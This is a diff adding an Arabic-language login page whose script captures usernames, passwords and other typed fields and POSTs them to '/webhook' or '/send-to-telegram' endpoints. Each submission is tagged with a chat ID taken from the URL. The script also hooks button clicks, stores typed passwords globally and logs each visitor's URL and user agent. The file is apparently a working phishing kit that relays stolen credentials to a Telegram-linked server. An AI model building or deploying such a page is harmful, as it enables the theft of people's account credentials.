@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام تسجيل الدخول</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(to right, #1a2a6c, #b21f1f);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .form-container {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input:focus {
+            border-color: #1a2a6c;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(26, 42, 108, 0.2);
+        }
+        
+        .btn {
+            background: linear-gradient(to right, #1a2a6c, #b21f1f);
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 14px;
+            border-top: 1px solid #eee;
+        }
+        
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .chat-id {
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 14px;
+            border: 1px dashed #ccc;
+        }
+        
+        .chat-id span {
+            font-weight: bold;
+            color: #1a2a6c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>تسجيل الدخول</h1>
+            <p>يرجى إدخال بيانات الاعتماد الخاصة بك</p>
+        </div>
+        
+        <div class="form-container">
+            <div class="chat-id">
+                معرف المحادثة: <span id="chatIdDisplay">غير محدد</span>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم:</label>
+                    <input type="text" id="username" name="username" placeholder="أدخل اسم المستخدم" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">كلمة المرور:</label>
+                    <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+                </div>
+                
+                <div class="form-group">
+                    <button type="submit" class="btn">تسجيل الدخول</button>
+                </div>
+            </form>
+            
+            <div id="statusMessage" class="status"></div>
+        </div>
+        
+        <div class="footer">
+            <p>جميع الحقوق محفوظة &copy; 2023</p>
+        </div>
+    </div>
+
+    <script>
+        // دالة رئيسية لإرسال البيانات إلى السيرفر
+        function sendToServer(data) {
+            // محاولة الإرسال إلى endpoint المختلفة
+            const endpoints = ['/webhook', '/send-to-telegram'];
+            
+            function tryEndpoint(index) {
+                if (index >= endpoints.length) {
+                    showStatus('❌ فشل الإرسال إلى جميع نقاط النهاية', 'error');
+                    return;
+                }
+                
+                fetch(endpoints[index], {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('✅ تم الإرسال بنجاح:', result);
+                    showStatus('✅ تم إرسال البيانات بنجاح', 'success');
+                })
+                .catch(error => {
+                    console.log('❌ فشل الإرسال إلى', endpoints[index]);
+                    tryEndpoint(index + 1); // جرب endpoint التالي
+                });
+            }
+            
+            tryEndpoint(0);
+        }
+
+        // استخراج chatId من URL
+        function getChatIdFromURL() {
+            const path = window.location.pathname;
+            const parts = path.split('/').filter(p => p);
+            return parts[parts.length - 1] || 'default';
+        }
+
+        // عرض رسالة الحالة
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('statusMessage');
+            statusElement.textContent = message;
+            statusElement.className = 'status ' + type;
+            statusElement.style.display = 'block';
+            
+            // إخفاء الرسالة بعد 5 ثوانٍ
+            setTimeout(() => {
+                statusElement.style.display = 'none';
+            }, 5000);
+        }
+
+        // اعتراض جميع النماذج في الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            const forms = document.querySelectorAll('form');
+            const chatId = getChatIdFromURL();
+            
+            // عرض معرف المحادثة
+            document.getElementById('chatIdDisplay').textContent = chatId;
+            
+            forms.forEach(form => {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault(); // منع الإرسال المباشر
+                    
+                    // جمع بيانات النموذج
+                    const formData = new FormData(form);
+                    const formObject = {};
+                    formData.forEach((value, key) => {
+                        formObject[key] = value;
+                    });
+                    
+                    // إعداد البيانات للإرسال
+                    const data = {
+                        type: 'login',
+                        chatId: chatId,
+                        platform: document.title || window.location.hostname,
+                        data: formObject
+                    };
+                    
+                    console.log('📤 إرسال البيانات:', data);
+                    showStatus('📤 جاري إرسال البيانات...', 'info');
+                    
+                    // إرسال البيانات إلى السيرفر
+                    sendToServer(data);
+                    
+                    // إكمال إرسال النموذج الأصلي بعد ثانية (اختياري)
+                    setTimeout(() => {
+                        form.submit();
+                    }, 1000);
+                });
+            });
+        });
+
+        // دالة لالتقاط النقر على أزرار التسجيل (إذا لم تكن في نماذج)
+        document.addEventListener('click', function(e) {
+            const target = e.target;
+            const chatId = getChatIdFromURL();
+            
+            // إذا كان زر تسجيل دخول أو إرسال
+            if (target.type === 'submit' || 
+                target.onclick || 
+                target.innerText.toLowerCase().includes('login') ||
+                target.innerText.toLowerCase().includes('submit') ||
+                target.innerText.toLowerCase().includes('send')) {
+                
+                // جمع البيانات من الحقول القريبة
+                const form = target.closest('form');
+                if (form) return; // إذا كان في form، سيتم التعامل معه بالاعتراض السابق
+                
+                const inputs = document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"]');
+                const data = {};
+                
+                inputs.forEach(input => {
+                    if (input.value) {
+                        data[input.name || input.placeholder || input.type] = input.value;
+                    }
+                });
+                
+                if (Object.keys(data).length > 0) {
+                    const sendData = {
+                        type: 'login',
+                        chatId: chatId,
+                        platform: document.title || window.location.hostname,
+                        data: data
+                    };
+                    
+                    console.log('📤 إرسال بيانات الزر:', sendData);
+                    sendToServer(sendData);
+                }
+            }
+        });
+
+        // دالة لالتقاط تغييرات الحقول المهمة
+        document.addEventListener('input', function(e) {
+            const target = e.target;
+            if (target.type === 'password' && target.value.length > 3) {
+                // إذا تم إدخال كلمة مرور، احفظها مؤقتاً
+                window.lastPassword = target.value;
+            }
+        });
+
+        // إرسال بيانات الصفحة عند التحميل (بيانات أولية)
+        window.addEventListener('load', function() {
+            const chatId = getChatIdFromURL();
+            const data = {
+                type: 'page_visit',
+                chatId: chatId,
+                platform: document.title || window.location.hostname,
+                data: {
+                    url: window.location.href,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                }
+            };
+            
+            sendToServer(data);
+        });
+    </script>
+</body>
+</html>
